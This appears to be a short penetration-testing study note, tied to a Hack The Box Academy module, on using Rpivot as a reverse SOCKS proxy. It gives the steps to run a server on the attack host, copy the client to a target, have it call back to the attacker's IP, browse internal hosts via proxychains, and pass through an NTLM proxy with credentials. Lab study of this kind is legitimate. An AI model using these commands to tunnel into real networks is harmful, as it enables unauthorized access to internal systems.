Web Server Pivoting with Rpivot
###############################

Date: 

Status: 

Tags: #pivoting around obstacles

Description
***********
Rpivot is a reverse SOCKS proxy for tunneling.  rpivot binds a machine inside a network to an external server adn exposes
the client local port on the server side. 


Installation
************

.. code-block:: console

    git clone https://github.com/klsecservices/rpivot.git


Use pyenv to switch to Python 2.7

Usage
*****


Example:  Setting up the connection

Step 1: Run Rpivot server from the attack host

.. code-block:: console

    python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

Step 2: Transfer rpivot to the client

.. code-block:: console

    scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/

Step 3: Run the client from the pivot target

.. code-block:: console

    python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

Now by using proxychains we can browse the internal network.

.. code-block:: console

    proxychains firefox-esr 172.16.5.135:80


NTLM Proxy
**********

Some cases where a proxy is enabled, you may have to use creds to connect.

Example:  Adding creds to the client

.. code-block:: console

    python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>



References 
***********
https://academy.hackthebox.com/module/158/section/1434